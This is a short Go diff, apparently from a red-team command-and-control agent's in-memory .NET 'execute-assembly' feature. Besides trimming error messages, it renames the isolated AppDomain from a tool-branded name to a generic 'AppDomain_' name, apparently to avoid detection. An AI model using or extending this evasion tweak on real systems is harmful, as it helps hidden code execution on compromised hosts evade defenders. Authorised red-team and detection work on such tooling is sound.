@@ -25,7 +25,7 @@ func executeAssemblyAction(assemblyB64, arguments string) structs.CommandResult 
 	var output strings.Builder
 
 	if assemblyB64 == "" {
-		return errorResult("Error: assembly (base64-encoded .NET assembly bytes) is required\nUsage: start-clr -action execute-assembly -assembly <base64> [-arguments 'arg1 arg2']")
+		return errorResult("assembly (base64-encoded .NET assembly bytes) is required\nUsage: start-clr -action execute-assembly -assembly <base64> [-arguments 'arg1 arg2']")
 	}
 
 	// Decode assembly bytes
@@ -34,7 +34,7 @@ func executeAssemblyAction(assemblyB64, arguments string) structs.CommandResult 
 		// Try raw base64 (no padding)
 		assemblyBytes, err = base64.RawStdEncoding.DecodeString(assemblyB64)
 		if err != nil {
-			return errorf("Error decoding assembly: %v (expected base64-encoded .NET assembly bytes)", err)
+			return errorf("decoding assembly: %v (expected base64-encoded .NET assembly bytes)", err)
 		}
 	}
 
@@ -174,7 +174,7 @@ func executeInIsolatedDomain(assemblyBytes []byte, args []string, log *strings.B
 	}
 
 	// Create isolated AppDomain
-	domainName := fmt.Sprintf("FawkesIsolated_%d", time.Now().UnixNano())
+	domainName := fmt.Sprintf("AppDomain_%d", time.Now().UnixNano())
 	namePtr, err := syscall.UTF16PtrFromString(domainName)
 	if err != nil {
 		assemblyMutex.Unlock()
